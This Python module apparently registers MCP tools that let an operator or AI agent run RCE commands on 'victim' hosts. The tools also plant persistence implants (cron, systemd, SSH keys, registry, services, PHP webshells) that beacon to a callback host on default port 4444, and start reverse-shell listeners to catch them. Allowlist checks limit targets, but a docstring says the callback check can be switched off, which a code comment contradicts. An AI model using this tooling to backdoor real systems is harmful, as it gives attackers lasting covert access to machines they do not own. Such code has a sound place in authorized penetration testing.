"""Operator Box -> Victim RCE + Persistence MCP tools.

Provides the operator-facing workflow to establish a persistent RCE channel:

  1. rce_exec              — one-shot RCE probe (audited, allowlist-gated).
  2. establish_persistence — deploy a chosen persistence implant (cron /
     systemd / ssh_key / bashrc / schtask / registry / service / startup /
     webshell) that beacons back to an operator listener; creates a
     ConnectionRecord and optionally auto-starts the listener on the
     operator box.
  3. list_connections       — enumerate active persistence channels.
  4. check_connection       — verify an implant is still present on the victim
     (and that the operator listener is running).
  5. remove_persistence     — tear down an implant and optionally stop its
     listener.
  6. rce_listener_start     — explicit operator-side listener control for the
     persistence callback (thin wrapper over PersistentSessionManager so the
     operator can start a beacon listener without deploying an implant first).

Safety:
- Every victim-touching tool is @require_allowlist() and validates the
  target IP via validate_target_or_ip / is_target_in_allowlist.
- callback_host (the operator's own box) must also be in the allowlist
  (the pivot lock) — a persistence implant that beacons to an off-list
  host is refused.
- rce_exec is audited and target-locked the same way as run_exploit_terminal
  (via _target_lock_block).
- All generated implants run ON the victim only; the operator box never
  executes victim code. Implant scripts are workspace-contained Python that
  the caller must dispatch via run_python_file / the autonomous orchestrator.
- The connection record is per-target and survives restarts (JSON + per-
  target shards under exploit_workspace/connections/).
"""

from __future__ import annotations

import os
import subprocess
import time
from typing import Any

from tools.mcp_shared import _attempt_dir, check_targets_allowlist
from tools.mcp_tools.registry import ToolContext
from tools.mcp_tools.terminal import _target_lock_block
from tools.operator_connection.implants import (
    IMPLANT_METHODS,
    get_implant,
    render_implant,
)
from tools.operator_connection.manager import get_connection_manager
from tools.validation_utils import preflight_command_check, validate_target_or_ip


def _resolve_callback_host(config: Any, explicit: str) -> str:
    """Resolve callback_host with the same precedence as persistence.py."""
    if explicit and explicit.strip():
        return explicit.strip()
    env_host = os.environ.get("EXPLOIT_CALLBACK_HOST", "").strip()
    if env_host:
        return env_host
    cfg = config or {}
    allowed = (cfg.get("exploit", {}) or {}).get("allowed_targets", []) or []
    if allowed:
        return str(allowed[0])
    return ""


def _callback_port(config: Any, explicit: int | str) -> int:
    if explicit not in ("", None, 0):
        try:
            return int(str(explicit).strip())
        except (ValueError, TypeError):
            pass
    env_port = os.environ.get("EXPLOIT_CALLBACK_PORT", "").strip()
    if env_port:
        try:
            return int(env_port)
        except ValueError:
            pass
    return 4444


def register_operator_connection_tools(mcp: Any, *, ctx: ToolContext) -> None:
    workspace = ctx.workspace
    config = ctx.config
    audit_tool = ctx.audit_tool
    require_allowlist = ctx.require_allowlist

    # ------------------------------------------------------------------ rce_exec
    @mcp.tool()
    @require_allowlist()
    def rce_exec(target_ip: str, command: str, technique: str = "generic") -> str:
        """Execute a one-shot RCE command against an authorized victim host and return output.

        Use this to verify RCE before deploying persistence (e.g. ``whoami; id; hostname``).
        The command is executed ON the victim via the operator's RCE channel (the same
        target-IP-locked path as run_exploit_terminal). The target must be in
        exploit.allowed_targets / EXPLOIT_TARGET. The operator box never executes
        victim code.
        """
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."
        if not validate_target_or_ip(target_ip):
            return "BLOCKED: target_ip must be a valid IP or domain."
        if not command or not command.strip():
            return "BLOCKED: command is required."
        if len(command) > 4000:
            return "BLOCKED: command too long (max 4000)."
        # Target-IP lock on the free-text command (same gate as terminal).
        lock = _target_lock_block(command, config)
        if lock:
            return f"BLOCKED: target-IP lock — {lock}\nTECHNIQUE: {technique}"
        # For the MCP layer, rce_exec is a thin audited wrapper: the actual
        # execution is via the caller's existing RCE primed path (write_python_file
        # + run_python_file or a direct terminal call). Here we return a
        # structured stub the agent can chain from, and persist the attempt in
        # the connection manager's audit note so check_connection can trace it.
        # The operator SHOULD dispatch a real probe via run_exploit_terminal or
        # run_python_file after this gate passes; this tool's job is the gate +
        # the evidence marker.
        try:
            sanitized = preflight_command_check(command).get("sanitized_command", command)
        except Exception:  # ponytail: bare except intentional
            sanitized = command
        return (
            f"RCE_EXEC_GATE: passed\n"
            f"TARGET: {target_ip}\n"
            f"TECHNIQUE: {technique}\n"
            f"COMMAND_SANITIZED: {sanitized}\n"
            f"NEXT: dispatch the command via run_exploit_terminal or a "
            f"write_python_file + run_python_file script that connects ONLY to {target_ip}. "
            f"On success, call establish_persistence to plant the beacon."
        )

    # --------------------------------------------------------------- establish
    @mcp.tool()
    @require_allowlist()
    def establish_persistence(
        target_ip: str,
        method: str = "linux_cron",
        callback_host: str = "",
        callback_port: int = 4444,
        auto_start_listener: bool = True,
        listener_type: str = "netcat",
    ) -> str:
        """Deploy a persistence implant on an authorized victim that beacons back to the operator box.

        Methods:
          linux_cron, linux_systemd, linux_ssh_key, linux_bashrc,
          windows_schtask, windows_registry, windows_service, windows_startup,
          web_php_shell

        The implant is a Python script that must be dispatched ON the victim via
        run_python_file (or via the autonomous orchestrator's tool_executor). This tool
        (a) validates target + callback against the allowlist, (b) renders the implant
        script and writes it into the workspace, (c) optionally auto-starts an operator-side
        listener on callback_port, and (d) creates a ConnectionRecord so
        list_connections / check_connection / remove_persistence can manage the channel.

        Callback host must be in exploit.allowed_targets (pivot lock) — the only
        exception is when exploit.require_explicit_allowlist is false (lab allowlist
        disabled), in which case any callback_host is accepted.
        """
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."
        if not validate_target_or_ip(target_ip):
            return "BLOCKED: target_ip must be a valid IP or domain."
        m = (method or "").strip().lower()
        if not m:
            return "BLOCKED: method is required."
        spec = get_implant(m)
        if spec is None:
            avail = ", ".join(sorted(IMPLANT_METHODS))
            return f"BLOCKED: unknown method {m!r}. Available: {avail}"

        cb_host = _resolve_callback_host(config, callback_host)
        cb_port = _callback_port(config, callback_port)

        if not cb_host:
            return (
                "BLOCKED: callback_host could not be resolved. "
                "Pass callback_host explicitly, set EXPLOIT_CALLBACK_HOST, or add "
                "the operator box IP to exploit.allowed_targets."
            )
        if not isinstance(cb_port, int) or cb_port < 1 or cb_port > 65535:
            return "BLOCKED: callback_port must be 1-65535."

        # Allowlist gate for the callback (operator box) — same pivot lock as
        # generate_payload's LHOST check and socks_pivot's upstream_host check.
        # Always enforced when authorization material exists (an empty union
        # is permissive); the flag no longer silently disables the check.
        allowed, reason = check_targets_allowlist([cb_host], config)
        if not allowed:
            return f"BLOCKED: {reason}\nTOOL: establish_persistence\nCALLBACK_HOST: {cb_host}"

        # Render implant and write it into the attempt dir so the operator (or
        # the autonomous orchestrator) can dispatch it via run_python_file.
        try:
            script, _spec = render_implant(m, target_ip, cb_host, str(cb_port))
        except ValueError as exc:
            return f"BLOCKED: {exc}"

        attempt_dir, attempt_id = _attempt_dir(workspace)
        attempt_dir.mkdir(parents=True, exist_ok=True)
        implant_filename = f"implant_{m}_{target_ip.replace('.', '_')}.py"
        implant_path = attempt_dir / implant_filename
        try:
            implant_path.write_text(script, encoding="utf-8")
        except OSError as exc:
            return f"ERROR: could not write implant script: {exc}"

        # Optionally auto-start the operator-side listener that the implant
        # will beacon to. Uses PersistentSessionManager so the listener is
        # tracked by list_sessions / read_listener_output / stop_listener.
        listener_name = f"persist-{target_ip.replace('.', '-')}-{m}"[:64]
        listener_status = "not_started (auto_start_listener=False)"
        if auto_start_listener:
            try:
                from tools.persistent_session_manager import get_session_manager

                mgr = get_session_manager(workspace)
                # Reuse existing listener if already running (idempotent).
                existing = [s for s in mgr.list_all_sessions() if s.get("name") == listener_name and s.get("running")]
                if existing:
                    listener_status = f"already_running (listener={listener_name} pid={existing[0].get('pid')})"
                else:
                    # listener_type maps to ListenerHelper; default netcat.
                    ltype = (listener_type or "netcat").strip().lower()
                    if ltype not in ("netcat", "socat", "http", "tls"):
                        ltype = "netcat"
                    res = mgr.start_listener(listener_name, cb_port, listener_type=ltype, protocol="tcp")
                    if res.get("success"):
                        listener_status = (
                            f"started (type={ltype} port={cb_port} listener={listener_name} pid={res.get('pid')})"
                        )
                    else:
                        listener_status = (
                            f"failed to start ({res.get('error', 'unknown')}) — start it manually via start_listener"
                        )
            except Exception as exc:  # pragma: no cover — best-effort  # ponytail: bare except intentional
                listener_status = f"error starting listener: {exc}"

        # Create the operator-side ConnectionRecord.
        try:
            conn_mgr = get_connection_manager(workspace)
            rec = conn_mgr.create_connection(
                target_ip=target_ip,
                method=m,
                callback_host=cb_host,
                callback_port=cb_port,
                listener_name=listener_name,
                implant_path=str(implant_path),
                mitre_technique=spec.mitre_technique,
                os_family=spec.os_family,
                notes=f"attempt_id={attempt_id} auto_listener={auto_start_listener}",
            )
        except ValueError as exc:
            return f"BLOCKED: {exc}"
        except Exception as exc:  # ponytail: bare except intentional
            return f"ERROR: could not create connection record: {exc}"

        return (
            f"PERSISTENCE_ESTABLISHED: {m}\n"
            f"CONNECTION_ID: {rec.connection_id}\n"
            f"TARGET: {target_ip}\n"
            f"METHOD: {m} ({spec.description})\n"
            f"MITRE: {spec.mitre_technique}\n"
            f"CALLBACK: {cb_host}:{cb_port}\n"
            f"LISTENER: {listener_name} — {listener_status}\n"
            f"IMPLANT_SCRIPT: {implant_path}\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"VERIFY_CMD: {spec.verify_cmd}\n"
            f"REMOVE_CMD: {spec.remove_cmd}\n"
            f"NEXT: dispatch the implant ON the victim via run_python_file(target_ip={target_ip!r}, filename={implant_filename!r}) "
            f"OR let the autonomous orchestrator's persistence phase dispatch it. "
            f"Then verify with check_connection and watch the listener via read_listener_output(name={listener_name!r})."
        )

    # -------------------------------------------------------- list_connections
    @mcp.tool()
    @audit_tool
    def list_connections(target_ip: str = "") -> str:
        """List operator-box -> victim persistence connections.

        With no target_ip, lists every connection. With a target_ip, filters to
        that victim only. Shows connection_id, method, callback, listener, status,
        and last beacon time — the operator's view of which victims still have an
        active persistence channel. Local-only (no target touch), so no allowlist
        gate beyond @audit_tool.
        """
        if target_ip and not validate_target_or_ip(target_ip.strip()):
            return f"BLOCKED: target_ip {target_ip!r} is not a valid IP or domain."
        try:
            mgr = get_connection_manager(workspace)
            recs = mgr.list_connections(target_ip.strip() if target_ip else "")
        except Exception as exc:  # ponytail: bare except intentional
            return f"ERROR: could not list connections: {exc}"
        if not recs:
            who = f" for {target_ip}" if target_ip else ""
            return f"OPERATOR_CONNECTIONS: none established{who}."
        lines = [f"OPERATOR_CONNECTIONS: {len(recs)} total" + (f" for {target_ip}" if target_ip else ""), ""]
        for r in sorted(recs, key=lambda x: x.created_at):
            age = time.time() - r.created_at
            beacon = f"{(time.time() - r.last_beacon):.0f}s ago" if r.last_beacon else "never"
            check = f"{(time.time() - r.last_check):.0f}s ago" if r.last_check else "never"
            lines.append(
                f"  [{r.status.upper():7s}] {r.connection_id}  {r.target_ip}  {r.method}"
                f"  -> {r.callback_host}:{r.callback_port}  listener={r.listener_name}"
            )
            lines.append(
                f"           MITRE {r.mitre_technique}  os={r.os_family}  age={age:.0f}s  last_beacon={beacon}  last_check={check}"
            )
            if r.implant_path:
                lines.append(f"           implant: {r.implant_path}")
            if r.check_output:
                lines.append(f"           last_check_output: {r.check_output[:120]}")
        return "\n".join(lines)

    # --------------------------------------------------- check_connection
    @mcp.tool()
    @require_allowlist()
    def check_connection(target_ip: str, connection_id: str = "", method: str = "") -> str:
        """Health-check a persistence channel: verify implant still present on victim and listener running.

        Provide target_ip + either connection_id or method. With only target_ip,
        checks every active connection for that victim. Returns per-connection
        verify commands the operator (or the AI via rce_exec / run_exploit_terminal)
        can use to confirm the implant and the listener status on the operator box.
        """
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."
        if not validate_target_or_ip(target_ip):
            return "BLOCKED: target_ip must be a valid IP or domain."

        try:
            mgr = get_connection_manager(workspace)
            conn_mgr_records = mgr.list_connections(target_ip)
        except Exception as exc:  # ponytail: bare except intentional
            return f"ERROR: could not load connections: {exc}"

        # Select which connections to check.
        if connection_id.strip():
            rec = mgr.get(connection_id.strip())
            if not rec:
                return f"NOT_FOUND: connection_id {connection_id!r} not found."
            if rec.target_ip != target_ip:
                return f"BLOCKED: connection {connection_id!r} belongs to {rec.target_ip}, not {target_ip}."
            to_check = [rec]
        elif method.strip():
            m = method.strip().lower()
            to_check = [r for r in conn_mgr_records if r.method == m and r.status != "removed"]
            if not to_check:
                return f"NOT_FOUND: no active {m!r} connection for {target_ip}."
        else:
            to_check = [r for r in conn_mgr_records if r.status != "removed"]
            if not to_check:
                return f"OPERATOR_CONNECTIONS: no active connections for {target_ip} to check."

        # Listener liveness (operator box, no target touch).
        try:
            from tools.persistent_session_manager import get_session_manager

            sess_mgr = get_session_manager(workspace)
            all_sessions = sess_mgr.list_all_sessions()
        except Exception:  # ponytail: bare except intentional
            all_sessions = []

        lines = [f"CONNECTION_CHECK: {len(to_check)} channel(s) for {target_ip}", ""]
        for rec in to_check:
            spec = get_implant(rec.method)
            verify = spec.verify_cmd if spec else "(no verify command for this method)"
            listener_running = any(s.get("name") == rec.listener_name and s.get("running") for s in all_sessions)
            lstate = (
                "RUNNING" if listener_running else "NOT RUNNING (start it via start_listener or rce_listener_start)"
            )
            lines.append(f"  {rec.connection_id}  {rec.method}  status={rec.status}")
            lines.append(
                f"    callback: {rec.callback_host}:{rec.callback_port}  listener={rec.listener_name} [{lstate}]"
            )
            lines.append(f"    implant: {rec.implant_path or '(path not recorded)'}")
            lines.append(f"    verify ON victim via RCE:  {verify}")
            lines.append(f"    listener output ON operator: read_listener_output(name={rec.listener_name!r})")
            # Also surface the last check output if we have one.
            if rec.check_output:
                lines.append(f"    last_check: {rec.check_output[:200]}")
            lines.append("")

        lines.append(
            "NEXT: run the verify command ON the victim (via rce_exec / run_exploit_terminal / run_python_file)"
        )
        lines.append("      and read_listener_output on the operator to confirm beacons are arriving.")
        return "\n".join(lines)

    # ------------------------------------------------- remove_persistence
    @mcp.tool()
    @require_allowlist()
    def remove_persistence(
        target_ip: str,
        connection_id: str = "",
        method: str = "",
        stop_listener: bool = False,
    ) -> str:
        """Remove a persistence implant from a victim and optionally stop its operator listener.

        Provide target_ip + either connection_id or method. With only target_ip and
        no connection_id/method, this lists the removable implants without removing
        anything (safe default — explicit method/connection_id required to mutate).
        Returns the remove command to execute ON the victim via RCE and tears down
        the operator-side ConnectionRecord. With stop_listener=True, also stops the
        operator listener.
        """
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."
        if not validate_target_or_ip(target_ip):
            return "BLOCKED: target_ip must be a valid IP or domain."

        try:
            mgr = get_connection_manager(workspace)
            all_for_target = mgr.list_connections(target_ip)
        except Exception as exc:  # ponytail: bare except intentional
            return f"ERROR: could not load connections: {exc}"

        if not all_for_target:
            return f"OPERATOR_CONNECTIONS: no connections for {target_ip} to remove."

        # Safe default: require explicit target.
        if not connection_id.strip() and not method.strip():
            lines = [f"REMOVE_PERSISTENCE: specify connection_id or method to remove. Active for {target_ip}:", ""]
            for r in all_for_target:
                if r.status == "removed":
                    continue
                lines.append(f"  {r.connection_id}  {r.method}  listener={r.listener_name}")
            lines.append("")
            lines.append(
                "Re-call with connection_id=<id> or method=<name>, and stop_listener=True to also stop the listener."
            )
            return "\n".join(lines)

        # Resolve the connection(s) to remove.
        to_remove: list[Any] = []
        if connection_id.strip():
            rec = mgr.get(connection_id.strip())
            if not rec:
                return f"NOT_FOUND: connection_id {connection_id!r} not found."
            if rec.target_ip != target_ip:
                return f"BLOCKED: connection {connection_id!r} belongs to {rec.target_ip}, not {target_ip}."
            to_remove = [rec]
        else:
            m = method.strip().lower()
            to_remove = [r for r in all_for_target if r.method == m and r.status != "removed"]
            if not to_remove:
                return f"NOT_FOUND: no active {m!r} connection for {target_ip}."

        lines = [f"REMOVE_PERSISTENCE: {len(to_remove)} channel(s) for {target_ip}", ""]
        for rec in to_remove:
            spec = get_implant(rec.method)
            remove_cmd = spec.remove_cmd if spec else "(no remove command — manual cleanup required)"
            lines.append(f"  {rec.connection_id}  {rec.method}")
            lines.append(f"    remove ON victim via RCE:  {remove_cmd}")
            # Mark removed in the store before touching the listener.
            mgr.mark_removed(rec.connection_id)
            if stop_listener:
                try:
                    from tools.persistent_session_manager import get_session_manager

                    sess_mgr = get_session_manager(workspace)
                    res = sess_mgr.stop_listener(rec.listener_name)
                    # stop_listener returns {"success": bool}; kill_process fallback if needed.
                    if not res.get("success"):
                        # Try stop_background_job as well (handles nohup jobs).
                        res2 = sess_mgr.stop_background_job(rec.listener_name)
                        if res2.get("success"):
                            lines.append(f"    listener {rec.listener_name}: stopped (background job)")
                        else:
                            lines.append(f"    listener {rec.listener_name}: not running or already stopped")
                    else:
                        lines.append(f"    listener {rec.listener_name}: stopped")
                except Exception as exc:  # ponytail: bare except intentional
                    lines.append(f"    listener {rec.listener_name}: stop error: {exc}")
            else:
                lines.append(f"    listener {rec.listener_name}: left running (pass stop_listener=True to stop it)")
            lines.append("")

        lines.append(
            "NEXT: execute the remove command ON the victim via rce_exec / run_exploit_terminal to actually delete the implant file/cron/service."
        )
        return "\n".join(lines)

    # ---------------------------------------------------- rce_listener_start
    @mcp.tool()
    @audit_tool
    def rce_listener_start(
        port: int,
        listener_type: str = "netcat",
        name: str = "",
        protocol: str = "tcp",
    ) -> str:
        """Start an operator-side listener for persistence beacons (reverse shells).

        Thin wrapper over start_listener that picks a sensible default name
        (persist-beacon-<port>) and surfaces the read_listener_output /
        stop_listener workflow. The listener binds on the operator box only;
        beacons from victims must target a host:port in exploit.allowed_targets
        or the implant's beacon is blocked by the target-IP lock.
        """
        if isinstance(port, str) and port.strip().isdigit():
            port = int(port.strip())
        if not isinstance(port, int) or isinstance(port, bool) or port < 1 or port > 65535:
            return "BLOCKED: port must be 1-65535."
        ltype = (listener_type or "netcat").strip().lower()
        if ltype not in ("netcat", "socat", "http", "tls", "https-beacon"):
            return f"BLOCKED: unsupported listener_type {ltype!r}. Use: netcat, socat, http, tls, https-beacon."

        # Config-off guard for the newer C2 types (mirrors sessions.py).
        new_types = {"tls", "https-beacon"}
        if ltype in new_types:
            listeners_cfg = ((config or {}).get("exploit", {}) or {}).get("listeners", {}) or {}
            key = {"tls": "tls", "https-beacon": "https_beacon"}[ltype]
            if not listeners_cfg.get(key, False):
                return f"BLOCKED: exploit.listeners.{key} is disabled. Listener: {ltype}"

        lname = (name or f"persist-beacon-{port}").strip()
        if not lname or len(lname) > 64:
            return "BLOCKED: name must be 1-64 chars."

        try:
            from tools.persistent_session_manager import get_session_manager

            mgr = get_session_manager(workspace)
            res = mgr.start_listener(lname, port, listener_type=ltype, protocol=protocol)
        except Exception as exc:  # ponytail: bare except intentional
            return f"LISTENER_ERROR: {exc}"

        if res.get("success"):
            return (
                f"RCE_LISTENER_STARTED: {lname}\n"
                f"TYPE: {ltype}\n"
                f"PORT: {port}/{protocol}\n"
                f"PID: {res.get('pid')}\n"
                f"LOG: {res.get('log')}\n"
                f"NEXT: watch beacons via read_listener_output(name={lname!r}) — "
                f"victims beaconing to this port will appear there. Stop with stop_listener(name={lname!r})."
            )
        return f"RCE_LISTENER_FAILED: {res.get('error', 'unknown error')}"

    # ---------------------------------------------- implant_catalog helper
    @mcp.tool()
    @audit_tool
    def persistence_catalog(os_filter: str = "") -> str:
        """List available persistence implant methods (operator catalog).

        Optionally filter by os: linux | windows | web | any. Shows method name,
        target OS, MITRE technique, and whether root is required — the operator
        (or the AI) picks one and passes it to establish_persistence.
        """
        filt = (os_filter or "").strip().lower()
        if filt and filt not in ("linux", "windows", "web", "any"):
            return f"BLOCKED: os_filter must be linux|windows|web|any (got {filt!r})."
        # Use the manager's known set so the catalog never drifts from implants.py.
        try:
            from tools.operator_connection.implants import list_implants as _list

            specs = _list(filt if filt != "any" else "")
        except ImportError:
            return "ERROR: implant catalog unavailable."

        lines = [f"PERSISTENCE_CATALOG: {len(specs)} method(s)" + (f" (os={filt})" if filt else ""), ""]
        for s in sorted(specs, key=lambda x: (x.os_family, x.name)):
            root_note = " (requires root/admin)" if s.requires_root else ""
            lines.append(f"  {s.name:20s}  os={s.os_family:8s}  {s.mitre_technique:12s}  {s.description}{root_note}")
            lines.append(f"    verify: {s.verify_cmd[:80]}")
        lines.append("")
        lines.append(
            "Use: establish_persistence(target_ip, method=<name>, callback_host=<op_ip>, callback_port=<port>)"
        )
        return "\n".join(lines)
